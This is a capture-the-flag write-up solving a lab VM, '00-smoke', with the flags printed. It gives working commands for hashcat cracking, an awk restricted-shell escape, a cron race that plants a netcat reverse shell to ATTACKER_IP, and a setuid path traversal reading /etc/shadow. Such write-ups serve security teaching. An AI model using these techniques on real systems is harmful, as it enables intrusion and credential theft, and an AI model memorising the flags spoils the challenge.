# 00-smoke

**Category:** Boot2Root | **Difficulty:** Entry (box 1 of the 4-box chain; "needs nothing — this is where you start") | **Flags:** user `Null0rigin{the_wordlist_was_the_target_all_along}` / root `Null0rigin{two_figures_off_a_payroll_sheet}`

## Challenge Description

> Smoke is not fire.
> It is what fire leaves before it arrives.

`00-smoke` is the first machine in the Null Origin boot-to-root chain, dressed up as an old colliery ("Smokeholt Colliery — Pit No.1"). The theming isn't just flavor: the in-game paperwork literally documents how the passwords are built, where a useful fault code lives, and which programs are unsafe. Reading the records *is* the recon.

Every box in this chain has two flags — `user.txt` (foothold) and a **sealed** `root.txt` (full compromise). Becoming root is necessary but not sufficient to open the root seal; the box tells you what the seal wants when you try.

## Recon & Initial Analysis

Standard full-port scan after importing and booting the OVA and finding its DHCP lease:

```bash
nmap -Pn -sC -sV -p- <TARGET_IP>
```

The interesting services:

```text
22/tcp    SSH
7701/tcp  Smokeholt shift board (wants a check figure before it talks)
7702/tcp  Lamp depot (does not)
```

The machine's MOTD spells it out: *"the shift board is on 7701 and wants a check figure before it will talk; the lamp depot is on 7702 and does not."*

**Rabbit hole warning:** port 7702 has a real path-traversal bug, but it's chrooted into a fake "lamp depot" filesystem that only contains decoy flags (`Null0rigin{the_depot_was_never_the_pit}`, `Null0rigin{rockyou_opened_a_door_onto_nothing}`). It's a separate jail, not the pit machine. This chain is deliberately stuffed with convincing fake flags — only the sealed files produce real ones.

## Foothold / Core Concept

**Core trick: the challenge's paperwork is a password mask, and the wordlist is the whole target.**

### 1. Open the shift board (7701)

Connecting hands you a fresh 8-char nonce and asks for the first 8 chars of its SHA-256. The nonce is per-connection, so you must answer on the *same* socket:

```bash
nc <TARGET_IP> 7701 | tee board-session.txt
# banner gives e.g. "board nonce: 1a2b3c4d"
printf %s 1a2b3c4d | sha256sum | cut -c1-8   # NOTE: no trailing newline
```

Send `SHIFT <8-char-result>` then `RECORDS`. A fresh nonce means nothing when the response is a simple *unkeyed* hash. `RECORDS` returns a base64 tarball between `BEGIN/END PIT RECORD STORE` markers:

```bash
sed -n '/BEGIN PIT RECORD STORE/,/END PIT RECORD STORE/p' board-session.txt \
  | sed '1d;$d' | tr -d '\r\n' | base64 -d > pit-records.tar.gz
mkdir pit-records && tar xzf pit-records.tar.gz -C pit-records
```

### 2. Turn the paperwork into a password list

`CREDENTIAL-STANDARD.txt`, `PERSONNEL-EXTRACT.txt`, and `office/audit-plant-accounts.txt` define the policy. Every password is: **base word** (any lowercase run of ≥5 letters found anywhere in the record store) + **class transform** + **2-digit seam** + **3-digit shot** + **one marker from `!@#$%&`**.

For the `assay` account (holder `sidebourne`, seam `96`, class `bundle`): bundle = lowercase + `sk-` prefix, so every candidate is `sk-WORD96DDD<marker>`. Build the vocabulary exactly as the policy describes and add the fixed pieces:

```bash
grep -rhoE '[a-z]{5,}' pit-records | sort -u > vocab.txt   # ~3037 words
awk '{print "sk-" $0 "96"}' vocab.txt > assay-bases.txt
```

The audit file hands you the `assay` SHA-512 crypt hash, so crack offline (append `DDD` + marker as a Hashcat hybrid mask):

```bash
hashcat -m 1800 -a 6 assay.hash assay-bases.txt '?d?d?d?1' -1 '!@#$%&'
# -> sk-sidebourne96493#   (the word is just the account holder's name)
```

### 3. SSH in and grab the user flag

```bash
ssh assay@<TARGET_IP>    # password sk-sidebourne96493#
```

You land in a restricted shell `pitsh` (allowed: `lamp readings unseal-user awk`). The user flag is sealed; the helper uses the plant password as part of its key:

```text
pit> unseal-user
plant password for assay: sk-sidebourne96493#
Null0rigin{the_wordlist_was_the_target_all_along}
```

> Offline alternative (no shell needed): the SMKSEAL1 seal format is attackable directly with `seal_oracle.py user <sealed> vocab.txt` — the plaintext always starts with `Null0rigin{`, giving a fast correctness oracle over the ~3037-word × 6000-suffix keyspace.

## Privilege Escalation

### 4. Escape `pitsh` via `awk`

`pitsh` blocks `; & | < > \` $` but still allows `awk`, and passes the whole line to `/bin/sh -c`. AWK's `system()` needs none of the forbidden characters:

```text
pit> awk 'BEGIN{system("/bin/sh")}'
```

An allowlist is only as safe as its most powerful allowed program — AWK is a full language, so allowing it ≈ allowing a shell.

### 5. Fragment #1 — the lamp fault code

`readings` describes `/var/lib/assay/lamp.log` but hides the tags. `STANDING-ORDER-14.txt` says any reading above `20.00` is a fault whose 12-byte tag field is the fault code. Exfil and parse the fixed 32-byte records (`lamp_parse.py`):

```text
entry: 1009  reading: 21.44  seam: dunsil  fault code: 93563208e2ee
```

Root-seal fragment #1 = `93563208e2ee`.

### 6. assay → clerk (4-second cron race)

A per-minute cron job runs `/usr/local/bin/lamp-rollup` as `clerk`. Each minute it chmods `/var/lib/assay/spool` to `0733` for **four seconds** (world-writable but not listable), then executes every `*.tally` file as `clerk`. It never checks who wrote the file, so loop until a drop lands in the window:

```bash
cat > /tmp/clerk.tally <<'EOF'
/usr/bin/nc <ATTACKER_IP> 4444 -e /bin/sh
EOF
until cp /tmp/clerk.tally /var/lib/assay/spool/clerk.tally 2>/dev/null; do sleep 0.1; done
```

Catch the reverse shell on your listener (`nc -lvnp 4444`) → you are `clerk`.

### 7. Fragment #2 + the setuid path-traversal

`/home/clerk/office.notes` yields fragment #2 (`office code 602f63e441f2`) and points at `/usr/local/bin/lampcheck` (`-rwsr-x--- root clerk`). It reads a cert name under `/var/lib/lamps` and tries to defuse traversal by stripping **one** `../`. Stripping one isn't enough:

```bash
/usr/local/bin/lampcheck ../../../../etc/shadow | tee /tmp/shadow
# ../../../../etc/shadow -> (one stripped) -> /var/lib/lamps/../../../etc/shadow -> /etc/shadow
```

A setuid file reader turns one path bug into arbitrary root-readable file access.

### 8. Crack root and unseal

Root is holder `hallden`, seam `48`, class `staff` (capitalize first letter). Reuse the vocabulary:

```bash
awk '{print toupper(substr($0,1,1)) substr($0,2) "48"}' vocab.txt > root-bases.txt
hashcat -m 1800 -a 6 root.hash root-bases.txt '?d?d?d?1' -1 '!@#$%&'
# -> Hallden48371#
su - root    # (root SSH is disabled, but we have a local clerk shell)
```

## Exploitation Walkthrough

```bash
# Root seal needs both fragments + the manager/root password at its prompt,
# AND a live boot record -- it must be run as root on the running VM.
/usr/local/bin/unseal 93563208e2ee 602f63e441f2
# password prompt: Hallden48371#
# -> Null0rigin{two_figures_off_a_payroll_sheet}
```

**Why the VM must be live:** `unseal` compares `/proc/sys/kernel/random/boot_id` against the shift board's boot record in `/run/smokeboard.boot`. `/run` is tmpfs populated at boot, so merely mounting the OVA's disk offline fails — and trying leads to the decoy `Null0rigin{a_mounted_disk_has_no_boot_id}`.

Full solve scripts: `seal_oracle.py` (offline seal brute-force), `decrypt_seal.py` (decrypt once the key material is known), `lamp_parse.py` (fault-code parser).

## Flags

user: `Null0rigin{the_wordlist_was_the_target_all_along}`
root: `Null0rigin{two_figures_off_a_payroll_sheet}`

(Keep the root flag exactly as submitted — it's required to open `28-blackdamp`'s root seal.)

## Key Takeaways

- In-game documentation can define a password mask as precisely as source code; the real target here was the wordlist, not any single service.
- A fresh nonce is worthless if its response is an unkeyed hash.
- Allowing AWK in a restricted shell is practically allowing a shell (`system()`).
- A 4-second writable window is exploitable the moment the attacker can retry in a loop.
- Stripping one `../` does not make a path safe; a setuid reader escalates that into arbitrary root reads.
- Decoy flags aren't proof — context matters (a service literally announcing it's a separate jail is telling you something).
